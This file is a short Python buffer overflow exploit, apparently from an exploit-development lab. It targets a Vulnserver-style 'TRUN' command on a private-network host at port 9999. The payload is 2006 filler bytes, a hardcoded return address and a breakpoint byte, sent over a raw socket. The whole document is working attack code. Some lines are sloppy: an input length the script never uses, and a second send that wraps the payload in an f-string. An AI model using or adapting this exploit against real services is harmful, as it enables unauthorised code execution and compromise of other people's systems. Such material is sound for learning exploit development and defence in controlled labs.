import socket
port , server = 9999, '192.168.1.112'
length = int(input('Length of attack: '))
print_output = lambda sock: print (sock.recv(1024).decode("utf-8").strip())
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
	connect = sock.connect((server, port))
	print_output(sock)
	print (f"Sending attack length {length} to TRUN .")
	attack = b'TRUN .' + (b'A' * 2006) + b"\xaf\x11\x50\x62" + b"\xcc"
	sock.send(attack)
	sock.send(str.encode(f"TRUN .{attack}\n"))
	print_output(sock)
	sock.send(str.encode('EXIT\n'))
	print_output(sock)
	sock.close()